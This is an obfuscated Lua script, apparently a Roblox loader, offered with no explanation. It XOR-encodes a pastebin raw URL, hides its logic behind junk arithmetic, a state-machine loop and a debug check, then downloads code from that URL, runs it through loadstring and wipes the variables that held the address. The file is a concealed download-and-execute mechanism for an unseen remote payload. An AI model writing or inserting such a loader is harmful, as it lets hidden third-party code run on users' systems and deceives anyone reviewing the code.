(function(...)
local _a, _b, _c, _d, _e = ...
local _f = string.char
local _g = string.byte
local _h = table.concat
local _i = _G
local _j = _i.loadstring
local _k = _i.game
local _l = _k.HttpGet
local _m = (_g("Z") - 0x5A) + (_g("A") - 0x40)
local _n = (_g("C") ^ 0x2) - 0x3E9
local _p = (_g("5") - 0x1A) ^ 0x1
local _q = (_g("C") - 0x10)
local _r = {
0x5B,0x47,0x47,0x43,0x40,0x09,0x1C,0x1C,0x43,0x52,0x40,0x47,0x56,0x51,0x5A,0x5D,
0x1D,0x50,0x5C,0x5E,0x1C,0x41,0x52,0x44,0x1C,0x03,0x45,0x5B,0x7F,0x4B,0x71,0x46,0x43
}
local _s = {}
for _t = 1, #_r do
_s[_t] = _f(_r[_t] ~ _q)
end
local _u = _h(_s)
local _v = 1
while _v < 5 do
if _v == 1 then
local _w = (_g("X") + _g("Y")) % 0x7F
_v = 2
elseif _v == 2 then
local _x = pcall(function() return _i.debug end)
if not _x then
_v = 5
else
_v = 3
end
elseif _v == 3 then
local _y = function()
local _z = _j(_l(_k, _u))
_z()
_u = nil
_r = nil
_s = nil
end
_y()
_v = 4
elseif _v == 4 then
local _A = function() end
_A()
_v = 5
else
break
end
end
end)(nil,nil,nil,nil,nil)
_0x = function() end
